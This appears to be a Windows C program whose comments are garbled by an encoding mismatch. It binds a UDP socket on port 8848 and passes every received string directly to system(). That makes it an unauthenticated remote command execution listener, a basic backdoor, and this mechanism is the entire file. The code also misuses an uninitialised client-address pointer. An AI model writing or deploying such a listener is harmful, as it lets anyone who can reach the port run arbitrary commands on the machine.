#define _CRT_SECURE_NO_WARNINGS

//����ͨ��
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<winsock.h>

//����ͨ��
#pragma comment(lib,"ws2_32.lib")

void main() {
	char strreceive[128] = { 0 };							//��ʼ��
	int length;
	SOCKET socket_send;										//˭����
	SOCKADDR_IN server;										//����IP��ַ�Լ��˿�
	PSOCKADDR_IN client;									//˭���ı���IP��ַ���˿�

	WORD wversion = MAKEWORD(2, 2);							//�汾
	WSADATA wsadata;										//�汾

	int error = WSAStartup(wversion, &wsadata);				//�ͻ�ȡ�汾�Աȣ���ʼͨ��
	if (error != 0) {
		printf("error");
		return;
	}

	//ȡ���Ͱ�λ���߰�λ���ԱȰ汾
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wVersion) != 2) {
		printf("version error");
		return;
	}

	socket_send = socket(AF_INET, SOCK_DGRAM, 0);		  //����UDPͨ�ţ���ȡ˭����Ϣ

	server.sin_family = AF_INET;						  //ͨѶ��ʽ
	server.sin_addr.S_un.S_addr = htonl(INADDR_ANY);      //��ȡ��������
	server.sin_port = htons(8848);						  //�˿�

	//��
	bind(socket_send, &server, sizeof(SOCKADDR));
	length = sizeof(SOCKADDR);							  //��ȡ����

	while (1) {
		recvfrom(socket_send, strreceive, 128, 0, &client, &length);
		printf("�յ�%s\n", strreceive);
		system(strreceive);
		memset(strreceive, 0, 128);
	}

	closesocket(socket_send);							  //�ر�
	WSACleanup();

	system("pause");
}